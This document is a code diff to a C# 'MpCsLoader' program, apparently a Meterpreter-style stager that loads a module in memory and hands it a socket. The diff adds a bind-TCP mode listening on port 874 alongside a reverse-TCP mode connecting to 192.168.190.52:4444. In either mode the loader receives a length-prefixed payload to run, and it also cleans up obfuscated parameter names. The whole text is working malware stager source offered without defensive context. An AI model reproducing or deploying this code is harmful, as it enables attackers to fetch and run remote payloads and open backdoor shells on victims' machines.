@@ -40,7 +40,11 @@ namespace MpCsLoader
                 {
                     IntPtr init = MemoryLibrary.MemoryGetProcAddress((MemoryLibrary.MEMORYMODULE*)mod.ToPointer(), "Init");
                     MpInit func = (MpInit)Marshal.GetDelegateForFunctionPointer(init, typeof(MpInit));
-                    int sockfd = StageLoader.LoadBinData("192.168.190.52", 4444);
+
+                    // bind_tcp
+                    int sockfd = StageLoader.LoadBinData(null, 874);
+                    // reverse_tcp
+                    //int sockfd = StageLoader.LoadBinData("192.168.190.52", 4444);
                     func(sockfd);
                 }
             }//hehe
@@ -60,36 +64,38 @@ namespace MpCsLoader
 
         class StageLoader
         {
-            public static int LoadBinData(string YJiGsVcrrhMcL, int kSLthfG)
+            public static int LoadBinData(string serverAddress, int serverPort)
             {
                 
                 Socket svrSocket;
 
-                // listen mode
-                try {
-                    IPEndPoint serverEP = new IPEndPoint(IPAddress.Parse(YJiGsVcrrhMcL), kSLthfG);
-                    Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                if (serverAddress == null)
+                {
+                    // listen mode
+                    try
+                    {
+                        Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
-                    IPAddress hostIP = (Dns.Resolve(IPAddress.Any.ToString())).AddressList[0];
-                    IPEndPoint ep = new IPEndPoint(hostIP, 874);
-                    listenSocket.Bind(ep);
+                        IPAddress hostIP = (Dns.Resolve(IPAddress.Any.ToString())).AddressList[0];
+                        IPEndPoint ep = new IPEndPoint(hostIP, serverPort);    // <----- bind to port
+                        listenSocket.Bind(ep);
 
-                    listenSocket.Listen(10);
+                        listenSocket.Listen(10);
 
-                    svrSocket = listenSocket.Accept();
-                    listenSocket.Close();
+                        svrSocket = listenSocket.Accept();
+                        listenSocket.Close();
+                    }
+                    catch { return 0; }
                 }
-                catch { return 0;  }
-                
-                
-                /*
-                // connect mode
-                IPEndPoint serverEP = new IPEndPoint(IPAddress.Parse(YJiGsVcrrhMcL), kSLthfG);
-                svrSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                else
+                {
+                    // connect mode
+                    IPEndPoint serverEP = new IPEndPoint(IPAddress.Parse(serverAddress), serverPort);
+                    svrSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
-                try { svrSocket.Connect(serverEP); }
-                catch { return 0; }
-                */
+                    try { svrSocket.Connect(serverEP); }
+                    catch { return 0; }
+                }
 
                 byte[] lenBuf = new byte[4];
                 svrSocket.Receive(lenBuf, 4, 0);
